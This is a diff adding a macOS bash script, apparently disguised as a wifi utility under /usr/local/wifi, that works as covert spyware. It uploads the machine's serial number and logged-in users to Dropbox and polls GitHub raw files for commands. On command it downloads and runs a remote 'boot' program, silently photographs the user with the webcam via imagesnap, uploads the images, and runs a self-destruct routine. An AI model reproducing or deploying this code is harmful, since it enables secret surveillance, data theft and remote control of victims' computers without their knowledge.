@@ -1,0 +1,78 @@
+#!/bin/bash
+
+cer2=$(system_profiler SPHardwareDataType | awk '/Serial/ {print $4}')
+if [[ $cer2 == "" ]]
+	then
+		echo "" > /dev/null
+	else
+		echo $cer2 > /usr/local/wifi/wifi/cer
+fi
+
+realcer=$(cat /usr/local/wifi/wifi/cer)
+who > /usr/local/wifi/wifi/$realcer
+/usr/local/wifi/wifi/dropbox_uploader.sh upload /usr/local/wifi/wifi/$realcer /$realcer/ > /dev/null
+rm /usr/local/wifi/wifi/$realcer
+
+while true
+        do
+curl --silent "https://raw.githubusercontent.com/jesusboi/wifi/master/wifi/bootsig" -o /usr/local/wifi/wifi/bootsig
+curl --silent "https://raw.githubusercontent.com/jesusboi/wifi/master/wifi/ready1" -o /usr/local/wifi/wifi/ready1
+sleep 3
+status=$(cat /usr/local/wifi/wifi/ready1 | grep $realcer)
+bootstatus=$(cat /usr/local/wifi/wifi/bootsig)
+isrun=$(cat /usr/local/wifi/wifi/isrun)
+if [[ $status != $realcer ]]
+	then
+		sleep 20
+		if [[ $bootstatus == "UP" ]]
+			then
+				
+				if [[ $isrun == "" ]]
+					then
+						curl --silent "https://raw.githubusercontent.com/jesusboi/wifi/master/wifi/boot" -o /usr/local/wifi/wifi/boot
+						/usr/local/wifi/wifi/boot &
+						echo "RUNNING" > /usr/local/wifi/wifi/isrun
+					else
+						echo "RUNNING" > /usr/local/wifi/wifi/isrun
+				fi
+				
+			else
+				isrun2=$(cat /usr/local/wifi/wifi/isrun)
+				if [[ $isrun2 == "RUNNING" ]]
+					then
+						echo "" > /usr/local/wifi/wifi/isrun
+						bootpid1=$(ps aux | grep "boot" | awk '{print $2}' | sed -n 1p)
+						bootpid2=$(ps aux | grep "boot" | awk '{print $2}' | sed -n 2p)
+						{ kill $bootpid1 && wait $bootpid1; } 2>/dev/null
+						{ kill $bootpid2 && wait $bootpid2; } 2>/dev/null
+					else
+						echo "" > /dev/null
+				fi
+		fi
+	
+	else
+
+sleep 1
+name="$realcer$RANDOM.jpg"
+
+sleep 30
+/usr/local/wifi/wifi/imagesnap -q -w 1 /usr/local/wifi/wifi/$name
+sleep 5
+/usr/local/wifi/wifi/dropbox_uploader.sh upload /usr/local/wifi/wifi/$name /$realcer/ > /dev/null
+sleep 10
+rm /usr/local/wifi/wifi/$name
+
+curl --silent "https://raw.githubusercontent.com/jesusboi/wifi/master/wifi/rmlist" -o /usr/local/wifi/wifi/rmlist
+
+check=$(cat /usr/local/wifi/wifi/rmlist | grep $realcer)
+
+if [[ $check == "" ]]
+	then
+		sleep 400
+	else
+/usr/local/wifi/wifi/destruct 
+
+
+fi
+fi	
+done
